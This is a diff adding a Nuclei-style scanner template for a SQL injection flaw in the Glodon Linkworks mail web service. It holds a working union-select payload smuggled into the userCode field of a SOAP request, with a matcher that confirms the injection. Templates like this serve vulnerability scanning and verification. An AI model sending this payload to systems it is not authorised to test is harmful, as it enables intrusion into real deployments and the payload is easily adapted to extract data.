@@ -1,0 +1,37 @@
+id: guangxuntong-emailaccountorguserservice-usercode-sqli
+info:
+  name: 广联达 Linkworks emailaccountorguserservice 接口 - SQL 注入漏洞
+  author: 2husky
+  severity: high
+  reference:
+    - www.exploit-db.com
+  metadata:
+    verified: true
+    max-request: 1
+    vuln-id: CT-821191
+    vendor: glodon
+    product: linkworks
+  tags: sqli,vuln,glodon
+variables:
+  s1: '{{rand_int(10000, 99999)}}'
+  s2: '{{rand_int(10000, 99999)}}'
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/Mail/Services/EmailAccountOrgUserService.asmx'
+    redirects: false
+    headers:
+      Content-Type: text/xml; charset=utf-8
+      SOAPAction: '"http://tempuri.org/GetUserIdByUserCode"'
+    body: |-
+      <?xml version="1.0" encoding="utf-8"?> <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+          <GetUserIdByUserCode xmlns="http://tempuri.org/">
+            <userCode>aa') union select {{s1}}*{{s2}},2--</userCode>
+          </GetUserIdByUserCode>
+        </soap:Body>
+      </soap:Envelope>
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, to_string(s1 * s2))'
